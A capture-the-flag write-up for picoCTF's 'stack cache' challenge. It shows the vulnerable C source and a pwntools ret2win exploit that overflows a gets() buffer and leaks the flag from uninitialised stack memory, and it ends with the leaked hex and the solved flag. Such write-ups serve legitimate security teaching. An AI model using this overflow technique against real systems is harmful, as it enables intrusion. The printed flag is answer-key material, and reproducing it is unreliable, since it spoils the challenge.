# stack cache
> Write-up author: vrescho
## DESCRIPTION:
Undefined behaviours are fun. It looks like Dr. Oswal allowed buffer overflows again. 
Analyse this program to identify how you can get to the flag. You can view source here. 
And connect with it using nc saturn.picoctf.net 62780
## HINT:
1. Maybe there is content left over from stack?
2. Try compiling it with gcc and clang-12 to see how the binaries differ
## STEPS:
1. Given a not stripped 32 bit binary file.

![image](https://user-images.githubusercontent.com/70703371/224532660-e0cbdbc3-c664-475a-b252-7a70c462c579.png)


2. Let's check the binary protections.

> VULN -> Partial RELRO, No PIE.

![image](https://user-images.githubusercontent.com/70703371/224532691-aa3cfd20-48ff-4f32-93b9-26543a44cf82.png)


3. Now check the source code.

> SOURCE

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 16
#define FLAGSIZE 64
#define INPSIZE 10

/*
This program is compiled statically with clang-12
without any optimisations.
*/

void win() {
  char buf[FLAGSIZE];
  char filler[BUFSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
}

void UnderConstruction() {
        // this function is under construction
        char consideration[BUFSIZE];
        char *demographic, *location, *identification, *session, *votes, *dependents;
	char *p,*q, *r;
	// *p = "Enter names";
	// *q = "Name 1";
	// *r = "Name 2";
        unsigned long *age;
	printf("User information : %p %p %p %p %p %p\n",demographic, location, identification, session, votes, dependents);
	printf("Names of user: %p %p %p\n", p,q,r);
        printf("Age of user: %p\n",age);
        fflush(stdout);
}

void vuln(){
   char buf[INPSIZE];
   printf("Give me a string that gets you the flag\n");
   gets(buf);
   printf("%s\n",buf);
   return;
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  printf("Bye!");
  return 0;
}

```

4. Based from it, we can control the **EIP** by overflow the buffer of var buf then return to the `win()` function, it's a simple ret2win concept then, but the problem is it doesn't cat or print out the flag text.
5. But, notice at the `UnderConstruction()` function, there's a pointer format string call, which we can utilize to leak the value from the stack memory.

> NOTES

```
Still need to return to the win() to trigger the flag written inside the flag.txt file stored in the stack memory (pointer)
```

6. So the payload we shall send is:

```
padding + win() + under() 
```

7. Let's craft the script then.

```c
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe], *a, **kw)

exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

sh = start()

padding = 14

p = flat([
    asm('nop') * padding,
    elf.sym['win'],
    elf.sym['UnderConstruction']
])

sh.sendline(p)

sh.interactive()

```

8. Create a file named flag.txt and store `AAAA..`'s inside it, then run the script locally to test our concept.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/224533323-65ed64c6-bfa4-45f9-a9b8-ccde9e2db826.png)


> 0x414141.. -> AAA.. -> successully leaked the flag value by calling the `UnderConstruction()`.

![image](https://user-images.githubusercontent.com/70703371/224533331-6af2c4b9-30b9-4769-aa61-972bd99d7829.png)


9. All good! Let's run it remotely.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/224533391-9d61a71e-a563-4d25-8bd6-15f7832bbbf2.png)


> LEAKED -> seperate it manually to find the correct hex leaked | 32 bit -> 8 bytes.

```
04 00 7d
62 61 34 64
63 31 63 34
5f 59 72 30
6d 33 4d 5f
50 75 5f 4e
34 65 6c 43
7b 46 54 43
6f 63 69 70
```

10. Convert it to strings.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/224533590-097fd383-922f-4e63-8386-a18a15c01337.png)

> reverse it

![image](https://user-images.githubusercontent.com/70703371/224533631-f7a65208-c7a5-4d5f-9a4d-1332a92651e6.png)


11. Got the flag!

## FLAG

```
picoCTF{Cle4N_uP_M3m0rY_4c1cd4ab}
```




